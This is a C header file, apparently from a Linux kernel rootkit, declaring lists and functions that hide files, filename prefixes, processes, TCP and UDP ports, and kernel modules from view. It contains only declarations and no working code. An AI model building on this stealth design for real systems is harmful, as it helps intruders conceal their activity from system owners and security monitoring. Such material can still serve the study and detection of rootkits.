#ifndef CONTROL_HEADER
#define CONTROL_HEADER

#include <linux/list.h>

#include "include.h"

/* list for hidden files (full path) */
struct file_name {
	struct list_head list;
	char name[1024];
};

/* list for hidden files (by prefix) */
struct file_prefix {
	struct list_head list;
	char name[64];
};

/* list for hidden processes (by pid) */
struct process {
	struct list_head list;
	pid_t pid;
};

/* list for hidden tcp sockets (by port) */
struct tcp_socket {
	struct list_head list;
	int port;
};

/* list for hidden udp sockets (by port) */
struct udp_socket {
	struct list_head list;
	int port;
};

/* list for hidden kernel modules (by module name) */
// TODO: think of a better way to store hidden modules
struct modules {
	struct list_head list;
	char name[32];
}; 



/*
 * Functions for adding and removing certain objects from hiding
 */

int
is_path_hidden(char *name);

int
hide_file_name(char *name);

int
unhide_file_name(char *name);

int
is_prefix_hidden(char *name);

int
hide_file_prefix(char *name);

int
unhide_file_prefix(char *name);

int
is_process_hidden(pid_t pid);

int
hide_process(pid_t pid);

int
unhide_process(pid_t pid);

int
is_tcp_socket_hidden(int port);

int
hide_tcp_socket(int port);

int
unhide_tcp_socket(int port);

int
is_udp_socket_hidden(int port);

int
hide_udp_socket(int port);

int
unhide_udp_socket(int port);

int
is_module_hidden(char *name);

int
hide_module(char *name);

int
unhide_module(char *name);

void
initialize_control(void);

void
cleanup_control(void);

#endif

